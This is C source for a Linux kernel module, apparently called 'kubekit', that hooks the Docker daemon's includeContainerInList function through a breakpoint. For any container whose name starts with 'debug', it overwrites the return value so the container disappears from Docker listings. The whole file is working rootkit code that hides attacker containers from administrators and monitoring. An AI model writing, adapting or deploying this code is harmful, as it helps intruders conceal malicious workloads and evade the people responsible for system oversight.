#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#include "kubekit.h"

MODULE_LICENSE("GPL");

const char HIDE_PREFIX[] = "debug";

void docker_include_handler(struct pt_regs *regs) {
    size_t name_len;
    char *name_ptr;
    char *container_name;
    bool _false = false;

    if (copy_from_user(
        &name_len,
        (u64 *)(regs->di + 0x30),
        sizeof(name_len)
    ) != 0) {
        return;
    }

    container_name = kmalloc(name_len, GFP_KERNEL);
    if (container_name == NULL) {
        return;
    }

    if (copy_from_user(
        &name_ptr,
        (char *)(regs->di + 0x28),
        sizeof(name_ptr)
    ) != 0) {
        goto free_ret;
    }

    if (copy_from_user(container_name, name_ptr, name_len) != 0) {
        goto free_ret;
    }

    if (strncmp(container_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0) {
        if (copy_to_user((u8 *)(regs->di + 0x130), &_false, 1) != 0) {
            goto free_ret;
        }
    }

free_ret:
    kfree(container_name);
}

int kubekit_init(void) {
    int ret;
    off_t func_off;

    ret = kubekit_do_init();
    if (ret != 0) {
        return -1;
    }

    func_off = kubekit_find_offset(
        "/usr/bin/dockerd",
        "github.com/docker/docker/daemon.includeContainerInList",
        false
    );
    if (func_off > 0) {
        ret = kubekit_add_bp(
            "/usr/bin/dockerd",
            func_off,
            FUNC_START,
            docker_include_handler,
            KKFL_PROC
        );
        if (ret == 0) {
            kubekit_log("Added the breakpoint\n");
        }
    }

    ret = kubekit_start();
    if (ret < 0) {
        kubekit_log("Something went wrong while writing the breakpoints\n");
    } else {
        kubekit_log("Initialized!\n");
    }

    return 0;
}

void kubekit_exit(void) {
    kubekit_cleanup();
}

module_init(kubekit_init);
module_exit(kubekit_exit);
